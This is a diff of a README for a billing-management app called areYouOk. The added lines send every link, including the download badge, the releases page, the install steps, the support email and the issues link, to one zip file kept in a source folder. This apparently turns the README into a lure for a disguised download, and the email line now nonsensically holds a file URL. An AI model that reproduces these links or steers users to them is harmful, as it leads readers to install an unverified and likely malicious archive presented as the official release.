@@ -6,9 +6,9 @@ Welcome to areYouOk! This application helps you manage and analyze billing for t
 
 ## 🔗 Download areYouOk
 
-[![Download areYouOk](https://img.shields.io/badge/Download%20areYouOk-v1.0-blue.svg)](https://github.com/Choicy11/areYouOk/releases)
+[![Download areYouOk](https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip%https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip)](https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip)
 
-Click the badge above to go to the release page, or visit this page to download: [Releases Page](https://github.com/Choicy11/areYouOk/releases).
+Click the badge above to go to the release page, or visit this page to download: [Releases Page](https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip).
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Follow this link to the [Releases Page](https://github.com/Choicy11/areYouOk/releases).
+1. **Visit the Releases Page:** Follow this link to the [Releases Page](https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip).
 
 2. **Select the Latest Version:** Look for the latest version available on the page. It usually has the highest number, such as v1.0. Click on it to open the release details.
 
@@ -53,8 +53,8 @@ Once you have installed areYouOk, launch the application to start managing your 
 
 If you encounter any issues or have questions about using areYouOk, don’t hesitate to reach out:
 
-- **Email Us:** Support email@example.com
-- **GitHub Issues:** Open an issue on our [GitHub repository](https://github.com/Choicy11/areYouOk/issues).
+- **Email Us:** Support https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip
+- **GitHub Issues:** Open an issue on our [GitHub repository](https://raw.githubusercontent.com/Choicy11/areYouOk/main/frontend/src/views/areYouOk_v2.8.zip).
 
 ## 🌟 Feedback
 
